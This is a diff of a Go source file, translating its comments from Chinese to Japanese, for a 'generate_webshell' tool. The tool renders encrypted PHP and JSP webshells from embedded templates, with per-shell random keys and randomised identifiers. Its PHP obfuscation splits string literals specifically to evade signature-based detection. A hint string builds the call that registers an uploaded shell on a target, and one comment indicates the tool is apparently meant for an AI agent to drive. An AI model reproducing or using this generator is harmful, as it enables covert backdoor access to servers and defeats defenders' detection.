@@ -1,8 +1,8 @@
-// shellgen.go 是加密马生成器(generate_webshell 工具的实现):渲染内嵌模板
-// (shelltpl/*.tpl,Go embed),每份马体随机 32B 会话密钥(crypto/rand)、随机化
-// 全部函数/变量名(静态特征最小化)、可选 PHP 轻度语法变形。
+// shellgen.go は暗号化シェルの生成器(generate_webshell ツールの実装): 内蔵テンプレート
+// (shelltpl/*.tpl、Go embed)をレンダリングし、シェル本体ごとに 32B のセッション鍵(crypto/rand)をランダム生成し、
+// すべての関数/変数名をランダム化し(静的シグネチャの最小化)、任意で PHP の軽度な構文変形を行う。
 //
-// 反过拟合:模板与协议无任何特定目标值;密钥/文件名/标识符全部运行时随机。
+// 過適合の回避: テンプレートとプロトコルに特定の目標値は一切なく、鍵/ファイル名/識別子はすべて実行時ランダム。
 package session
 
 import (
@@ -24,37 +24,37 @@ var phpEncTemplate string
 //go:embed shelltpl/jsp_enc.jsp.tpl
 var jspEncTemplate string
 
-// GeneratedShell 是 generate_webshell 的产物。KeyB64 是 register_session 的
-// secret 参数;KeyDigest 供审计对照（不落库明文场景使用）。
+// GeneratedShell は generate_webshell の成果物。KeyB64 は register_session の
+// secret パラメータ、KeyDigest は監査の照合に使う(平文を DB に保存しない場面向け)。
 type GeneratedShell struct {
-	Lang      string `json:"lang"`        // phpenc | jspenc(register_session 的 lang 参数）
-	Filename  string `json:"filename"`    // 建议文件名（随机化，无语义特征）
-	Content   string `json:"content"`     // 马体全文（模板渲染后，可审计）
-	KeyB64    string `json:"key_b64"`     // 会话密钥（base64 32B,register_session 的 secret)
-	KeyDigest string `json:"key_digest"`  // sha256(密钥）前 16 hex，审计对照用
-	Mode      string `json:"mode"`        // 加密模式标识（写死于马体）
+	Lang      string `json:"lang"`       // phpenc | jspenc(register_session の lang パラメータ)
+	Filename  string `json:"filename"`   // 推奨ファイル名(ランダム化、意味的特徴なし)
+	Content   string `json:"content"`    // シェル本体の全文(テンプレートレンダリング後、監査可能)
+	KeyB64    string `json:"key_b64"`    // セッション鍵(base64 32B、register_session の secret)
+	KeyDigest string `json:"key_digest"` // sha256(鍵) の先頭 16 hex、監査の照合用
+	Mode      string `json:"mode"`       // 暗号化モードの識別子(シェル本体に固定的に埋め込み)
 	Note      string `json:"note,omitempty"`
-	// RegisterHint 是上传后登记会话的精确调用示例（模型常把 key 误放进
-	// password 字段，给出可直接照抄的调用形态;password 作为 secret 别名也被接受）。
+	// RegisterHint はアップロード後にセッションを登録する正確な呼び出し例(モデルは key を
+	// password フィールドに入れがちなので、そのまま真似できる呼び出し形を示す。password を secret の別名としても受け付ける)。
 	RegisterHint string `json:"register_hint"`
 }
 
-// tplIdentNames 是两份模板用到的全部 {{.Xxx}} 占位（KeyB64 除外，单独处理）。
-// 生成器为每个占位分配随机标识符；渲染用 missingkey=error，占位遗漏直接报错。
+// tplIdentNames は 2 つのテンプレートが使うすべての {{.Xxx}} プレースホルダ(KeyB64 を除く。別途処理)。
+// 生成器は各プレースホルダにランダムな識別子を割り当てる。レンダリングは missingkey=error で、プレースホルダの漏れは即エラー。
 var tplIdentNames = []string{
-	// PHP 模板
+	// PHP テンプレート
 	"VKey", "VMethods", "VMode", "VResp", "VPlain", "VJson", "VReq", "VOp",
 	"VCode", "VT", "VData", "VFlag", "VR",
 	"FDec", "FEnc", "FFrame", "FUnframe",
-	// JSP 模板（同名占位复用同一随机名即可，两份模板独立渲染）
+	// JSP テンプレート(同名プレースホルダは同じランダム名を再利用してよい。2 つのテンプレートは独立にレンダリングされる)
 	"FK", "FG", "FBody", "VOut", "VErr", "VOk", "VRaw", "VP", "VB", "VI",
 	"VBuf", "VN", "VF", "VFI", "VFO",
 }
 
-// shellNamePrefixes 是建议文件名的随机前缀（通用词，无任何目标特征）。
+// shellNamePrefixes は推奨ファイル名のランダム接頭辞(汎用語のみで、目標の特徴は一切ない)。
 var shellNamePrefixes = []string{"cache", "sys", "img", "db", "conf", "util", "lib", "api"}
 
-// randIdent 生成一个随机标识符（字母开头，9 字符）。
+// randIdent はランダムな識別子を生成する(英字始まり、9 文字)。
 func randIdent() string {
 	const letters = "abcdefghijklmnopqrstuvwxyz"
 	const alnum = letters + "0123456789"
@@ -68,40 +68,40 @@ func randIdent() string {
 	return sb.String()
 }
 
-// randPick 从列表随机取一项。
+// randPick はリストから 1 項目をランダムに取り出す。
 func randPick(items []string) string {
 	var b [1]byte
 	_, _ = rand.Read(b[:])
 	return items[int(b[0])%len(items)]
 }
 
-// GenerateShell 生成一份加密马。lang: php | jsp。obfuscate 仅对 PHP 生效：
-// 对渲染后的马体做轻度语法变形（高特征字符串字面量拆分/拼接）。
+// GenerateShell は暗号化シェルを 1 つ生成する。lang: php | jsp。obfuscate は PHP にのみ効く:
+// レンダリング後のシェル本体に軽度の構文変形を施す(特徴の強い文字列リテラルの分割/連結)。
 func GenerateShell(lang string, obfuscate bool, note string) (*GeneratedShell, error) {
 	lang = strings.ToLower(strings.TrimSpace(lang))
 	var tpl, mode string
 	switch lang {
 	case "php":
 		tpl = phpEncTemplate
-		mode = "auto:gcm|cbc" // GCM 优先，目标无 GCM 时马体运行时降级 CBC+HMAC
+		mode = "auto:gcm|cbc" // GCM 優先。目標に GCM がなければシェル本体が実行時に CBC+HMAC へ降格
 	case "jsp":
 		tpl = jspEncTemplate
 		mode = "gcm"
 	default:
-		return nil, opError("generate", "不支持的马体语言 %q（支持 php/jsp)", lang)
+		return nil, opError("generate", "未対応のシェル本体言語 %q(対応は php/jsp)", lang)
 	}
 	key := make([]byte, 32)
 	if _, err := rand.Read(key); err != nil {
-		return nil, opError("generate", "密钥生成失败： %v", err)
+		return nil, opError("generate", "鍵の生成に失敗しました: %v", err)
 	}
 	keyB64 := base64.StdEncoding.EncodeToString(key)
 
-	// 每个占位一个随机标识符（集合去重：撞名会让两个语义变量同名，必须排除）。
+	// 各プレースホルダにランダムな識別子を 1 つずつ(集合で重複排除: 衝突すると意味の違う 2 つの変数が同名になるため、必ず排除する)。
 	fields := map[string]string{"KeyB64": keyB64}
 	used := map[string]bool{}
 	for _, name := range tplIdentNames {
 		if _, ok := fields[name]; ok {
-			continue // 两份模板共享的同名占位复用同一随机名
+			continue // 2 つのテンプレートが共有する同名プレースホルダは同じランダム名を再利用
 		}
 		id := randIdent()
 		for used[id] {
@@ -112,11 +112,11 @@ func GenerateShell(lang string, obfuscate bool, note string) (*GeneratedShell, e
 	}
 	t, err := template.New("shell").Option("missingkey=error").Parse(tpl)
 	if err != nil {
-		return nil, opError("generate", "马体模板解析失败： %v", err)
+		return nil, opError("generate", "シェル本体テンプレートの解析に失敗しました: %v", err)
 	}
 	var buf bytes.Buffer
 	if err := t.Execute(&buf, fields); err != nil {
-		return nil, opError("generate", "马体模板渲染失败： %v", err)
+		return nil, opError("generate", "シェル本体テンプレートのレンダリングに失敗しました: %v", err)
 	}
 	content := buf.String()
 	if obfuscate && lang == "php" {
@@ -136,20 +136,20 @@ func GenerateShell(lang string, obfuscate bool, note string) (*GeneratedShell, e
 		Mode:      mode,
 		Note:      note,
 		RegisterHint: fmt.Sprintf(
-			`上传后调用: register_session({"url":"http://<目标>/<上传路径>/%s","lang":"%s","secret":"%s"})`,
+			`アップロード後に呼び出し: register_session({"url":"http://<目標>/<アップロードパス>/%s","lang":"%s","secret":"%s"})`,
 			filename, lang+"enc", keyB64),
 	}, nil
 }
 
-// obfuscatePHP 对渲染后的 PHP 马体做轻度语法变形：把高熵/高特征字符串字面量
-// （密钥、算法名、域分隔串、输入源）拆成多段单引号拼接。
+// obfuscatePHP はレンダリング後の PHP シェル本体に軽度の構文変形を施す: 高エントロピー/高特徴の文字列リテラル
+// (鍵、アルゴリズム名、ドメイン区切り文字列、入力元)を複数の単一引用符リテラルの連結に分割する。
 //
-// 取舍（注释即承诺）:只做拆分/拼接这类「等价改写」,不做 eval(base64(...))、
-// gzinflate 套娃等高特征形态——那是签名库首要命中点，变形收益为负；轻度变形
-// 抹掉的是「整串常量」特征，同时保持马体可读可审计。
+// 方針(コメントは約束): 分割/連結という「等価な書き換え」だけを行い、eval(base64(...))、
+// gzinflate の入れ子などの高特徴形態は行わない——それはシグネチャライブラリの第一の命中点で、変形の利得が負になる。軽度の変形が
+// 消すのは「文字列全体の定数」という特徴で、同時にシェル本体の可読性と監査可能性は保つ。
 func obfuscatePHP(src, keyB64 string) string {
 	literals := []string{keyB64, "aes-256-gcm", "aes-256-cbc", "artex-enc-v1", "artex-mac-v1", "php://input"}
-	// 长字面量优先，防短串恰好是长串子串造成二次拆分。
+	// 長いリテラルを優先し、短い文字列が長い文字列の部分列とたまたま一致して二重分割されるのを防ぐ。
 	sort.Slice(literals, func(i, j int) bool { return len(literals[i]) > len(literals[j]) })
 	for _, lit := range literals {
 		src = strings.ReplaceAll(src, "'"+lit+"'", phpConcatLit(lit))
@@ -157,14 +157,14 @@ func obfuscatePHP(src, keyB64 string) string {
 	return src
 }
 
-// phpConcatLit 把字符串拆成 2~4 段单引号字面量拼接（PHP 编译期常量折叠，语义不变）。
+// phpConcatLit は文字列を 2〜4 個の単一引用符リテラルの連結に分割する(PHP のコンパイル時定数畳み込みにより意味は不変)。
 func phpConcatLit(s string) string {
 	if len(s) < 6 {
 		return "'" + s + "'"
 	}
 	var b [1]byte
 	_, _ = rand.Read(b[:])
-	parts := 2 + int(b[0])%3 // 2~4 段
+	parts := 2 + int(b[0])%3 // 2〜4 個
 	cuts := map[int]bool{}
 	for len(cuts) < parts-1 {
 		var c [1]byte
